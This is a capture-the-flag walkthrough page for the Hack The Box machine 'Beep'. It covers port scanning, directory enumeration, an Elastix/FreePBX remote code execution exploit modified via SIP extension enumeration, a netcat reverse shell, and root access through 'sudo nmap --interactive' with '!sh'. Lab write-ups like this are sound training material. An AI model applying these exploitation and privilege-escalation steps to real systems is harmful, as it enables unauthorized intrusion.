@@ -1,0 +1,129 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>Beep Walkthrough</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+
+    <h1>Beep Walkthrough</h1>
+
+    <hr>
+
+    <h2>Contents</h2>
+    <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#portscan">Port Scanning</a></li>
+        <li><a href="#infogather">Information Gathering</a></li>
+        <li><a href="#Asterisk">Shell - Asterisk</a></li>
+        <li><a href="#root">Shell - root</a></li>
+    </ul>
+
+    <h2><a id="summary">Summary</a></h2>
+
+    <p>This box has multiple paths to root.  I chose to attack port 443 where we are able to find an exploit that grants remote code execution.  Use this exploit we gain a reverse shell after some slight modification.  Escalating to root is simply achieved through abusing sudo rights to nmap.</p>
+
+    <h2><a id="portscan">Port Scanning</a></h2>
+
+    <li>Running a port scan against the full port range to determine which ones are open.</li>
+
+    <pre>&#13;&#10;# Nmap 7.91 scan initiated Mon Oct 18 09:53:09 2021 as: nmap -p- -oN ping_tcp 10.129.1.226&#13;&#10;Nmap scan report for 10.129.1.226&#13;&#10;Host is up (0.048s latency).&#13;&#10;Not shown: 65519 closed ports&#13;&#10;PORT      STATE SERVICE&#13;&#10;22/tcp    open  ssh&#13;&#10;25/tcp    open  smtp&#13;&#10;80/tcp    open  http&#13;&#10;110/tcp   open  pop3&#13;&#10;111/tcp   open  rpcbind&#13;&#10;143/tcp   open  imap&#13;&#10;443/tcp   open  https&#13;&#10;941/tcp   open  unknown&#13;&#10;993/tcp   open  imaps&#13;&#10;995/tcp   open  pop3s&#13;&#10;3306/tcp  open  mysql&#13;&#10;4190/tcp  open  sieve&#13;&#10;4445/tcp  open  upnotifyp&#13;&#10;4559/tcp  open  hylafax&#13;&#10;5038/tcp  open  unknown&#13;&#10;10000/tcp open  snet-sensor-mgmt&#13;&#10;&#13;&#10;# Nmap done at Mon Oct 18 09:53:33 2021 -- 1 IP address (1 host up) scanned in 23.82 seconds        &#13;&#10;    </pre>
+
+    <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>
+
+    <pre>&#13;&#10;# Nmap 7.91 scan initiated Mon Oct 18 09:54:32 2021 as: nmap -p22,25,80,110,111,143,443,941,993,995,3306,4190,4445,4559,5038,10000 -sV -sC -oN script_tcp 10.129.1.226&#13;&#10;Nmap scan report for 10.129.1.226&#13;&#10;Host is up (0.043s latency).&#13;&#10;&#13;&#10;PORT      STATE SERVICE    VERSION&#13;&#10;22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)&#13;&#10;| ssh-hostkey: &#13;&#10;|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)&#13;&#10;|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)&#13;&#10;25/tcp    open  smtp?&#13;&#10;|_smtp-commands: Couldn&apos;t establish connection on port 25&#13;&#10;80/tcp    open  http       Apache httpd 2.2.3&#13;&#10;|_http-server-header: Apache/2.2.3 (CentOS)&#13;&#10;|_http-title: Did not follow redirect to https://10.129.1.226/&#13;&#10;110/tcp   open  pop3?&#13;&#10;111/tcp   open  rpcbind    2 (RPC #100000)&#13;&#10;| rpcinfo: &#13;&#10;|   program version    port/proto  service&#13;&#10;|   100000  2            111/tcp   rpcbind&#13;&#10;|   100000  2            111/udp   rpcbind&#13;&#10;|   100024  1            938/udp   status&#13;&#10;|_  100024  1            941/tcp   status&#13;&#10;143/tcp   open  imap?&#13;&#10;443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))&#13;&#10;| http-robots.txt: 1 disallowed entry &#13;&#10;|_/&#13;&#10;|_http-server-header: Apache/2.2.3 (CentOS)&#13;&#10;|_http-title: Elastix - Login page&#13;&#10;| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--&#13;&#10;| Not valid before: 2017-04-07T08:22:08&#13;&#10;|_Not valid after:  2018-04-07T08:22:08&#13;&#10;|_ssl-date: 2021-10-18T13:59:03+00:00; -1s from scanner time.&#13;&#10;941/tcp   open  status     1 (RPC #100024)&#13;&#10;993/tcp   open  imaps?&#13;&#10;995/tcp   open  pop3s?&#13;&#10;3306/tcp  open  mysql?&#13;&#10;|_mysql-info: ERROR: Script execution failed (use -d to debug)&#13;&#10;|_ssl-cert: ERROR: Script execution failed (use -d to debug)&#13;&#10;|_ssl-date: ERROR: Script execution failed (use -d to debug)&#13;&#10;|_sslv2: ERROR: Script execution failed (use -d to debug)&#13;&#10;|_tls-alpn: ERROR: Script execution failed (use -d to debug)&#13;&#10;|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)&#13;&#10;4190/tcp  open  sieve?&#13;&#10;4445/tcp  open  upnotifyp?&#13;&#10;4559/tcp  open  hylafax?&#13;&#10;5038/tcp  open  asterisk   Asterisk Call Manager 1.1&#13;&#10;10000/tcp open  http       MiniServ 1.570 (Webmin httpd)&#13;&#10;|_http-title: Site doesn&apos;t have a title (text/html; Charset=iso-8859-1).&#13;&#10;Service Info: Host: 127.0.0.1&#13;&#10;&#13;&#10;Host script results:&#13;&#10;|_clock-skew: -1s&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Mon Oct 18 10:04:13 2021 -- 1 IP address (1 host up) scanned in 581.59 seconds&#13;&#10;    </pre>
+
+    <br>
+    <h2><a id="infogather">Information Gathering</a></h2>
+
+    <li>The nmap scan reveals websites on ports 80, 443, and 10000.  However, port 80 redirects to 443, so there are really two different websites we are dealing with.</li>
+    <ul>
+        <li>443 - Elastix login page</li>
+        <li>10000 - Webmin login page</li>
+    </ul>
+
+    <li>Using gobuster against the Elastix login page reveals more directories we can take a look at.  I used the command "gobuster dir -u https://10.129.1.226 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -k -t 50 | tee 443-raft" and then inverse grepped the output to exclude 403 status responses.</li>
+
+    <img src="../images/beep/gobuster443.png">
+
+    <br>
+    <br>
+
+    <li>I visit https://10.129.1.266/admin/ and the first thing that I see is a pop up box asking for username and password.</li>
+
+    <img src="../images/beep/admin_auth_box.png">
+    
+    <br>
+    <br>
+
+    <li>I try a few credentials but nothing works.  After trying twice or clicking "cancel"  I am brought to this page.</li>
+
+    <img src="../images/beep/admin_unauthorized.png">
+
+    <br>
+    <br>
+
+    <h2><a id="Asterisk">Shell - Asterisk</a></h2>
+
+    <li>This page reveals "FreePBX 2.8.1.4" which will help us search for an exploit.  I turn to searchsploit and I search for "elastix" which is the name of the web application on port 443.  Searching for "elastix" reveals an exploit for "FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution".  This exploit references a slightly newer version of FreePBX which makes it sound promising.</li>
+
+    <img src="../images/beep/elastix_searchsploit.png">
+
+    <li>I download the exploit and take a look.  The first thing I need to do is edit the rhost to be the victim machine's ip address.  I also update lhost to be my ip address.  lport is set to 443 already which is probably a good port for our reverse listener anyways.  So I setup my netcat listener on port 443 (nc -lvnp 443).  Then I run the exploit.  The script just hangs for a while and does not appear to do anything.</li>
+
+    <br>
+
+    <li>At this point I take a more manual approach the the exploit.  All this exploit seems to be doing is filling in the blanks in a url with our ip and port # as well as the victim's phone extension and ip address.  So I edit the script to make it print the url it is attempting to visit in order to make the exploit work.  I add "print url" before the urllib.urlopen(url) line. </li>
+
+    <img src="../images/beep/print_url.png">
+
+    <br>
+    <br>
+
+    <li>Now I execute the script and it outputs the url it is attemping to visit.</li>
+
+    <img src="../images/beep/exploit_url.png">
+
+    <br>
+    <br>
+
+    <li>Now I setup burp to intercept requests and I visit that url.  Then I send that web request to repeater and observe the response I am getting from the web server.</li>
+
+    <img src="../images/beep/burp.png">
+
+    <br>
+    <br>
+
+    <li>Burp is showing "The call failed.  Perhaps the line was busy." in the response.  Which makes me wonder if this is causing the exploit to not work.  So now I search for an extension which is not busy.  To do this I will use svwar.  svwar is a tool that will enumerate through all the extension testing to see if they exist or not.</li>
+
+    <img src="../images/beep/svwar.png">
+
+    <br>
+    <br>
+
+    <li>In the command above I set the extension range from 1-10000.  Then I set the -m flag to INVITE in order to specify svwar to use the INVITE method while enumerating.  The default method was not giving results for this box.  Instead of using the python exploit I simply edit the URL to replace 1000 with the extension 233.  I also make sure my netcat listener is set on port 443 because I should get a reverse shell connection.</li>
+
+    <img src="../images/beep/mod_exploit.png">
+
+    <br>
+    <br>
+
+    <li>The reverse shell connects to my netcat listener.</li>
+
+    <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Beep/WebEnum]&#13;&#10;&boxur;&HorizontalLine;$ nc -lvnp 443                                 130 &Cross;&#13;&#10;Ncat: Version 7.91 ( https://nmap.org/ncat )&#13;&#10;Ncat: Listening on :::443&#13;&#10;Ncat: Listening on 0.0.0.0:443&#13;&#10;Ncat: Connection from 10.129.1.226.&#13;&#10;Ncat: Connection from 10.129.1.226:49202.&#13;&#10;id&#13;&#10;uid=100(asterisk) gid=101(asterisk)&#13;&#10;    </pre>
+
+    <br>
+    <h2><a id="root">Shell - Root</a></h2>
+
+    <li>In order go gain root, I will refer back to the exploit script I just used to get the reverse shell.  In the commented out area it says to use the command "sudo nmap --interactive" and then the command "!sh" and then a root shell will be obtained.</li>
+
+    <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Beep/WebEnum]&#13;&#10;&boxur;&HorizontalLine;$ nc -lvnp 443                                 130 &Cross;&#13;&#10;Ncat: Version 7.91 ( https://nmap.org/ncat )&#13;&#10;Ncat: Listening on :::443&#13;&#10;Ncat: Listening on 0.0.0.0:443&#13;&#10;Ncat: Connection from 10.129.1.226.&#13;&#10;Ncat: Connection from 10.129.1.226:49202.&#13;&#10;id&#13;&#10;uid=100(asterisk) gid=101(asterisk)&#13;&#10;sudo nmap --interactive&#13;&#10;&#13;&#10;Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )&#13;&#10;Welcome to Interactive Mode -- press h &lt;enter&gt; for help&#13;&#10;nmap&gt; !sh&#13;&#10;id&#13;&#10;uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)&#13;&#10;    </pre>
+
+    <li>I follow those instructions and it works.  We have a root shell.</li>
+
+</body>
+</html>
+
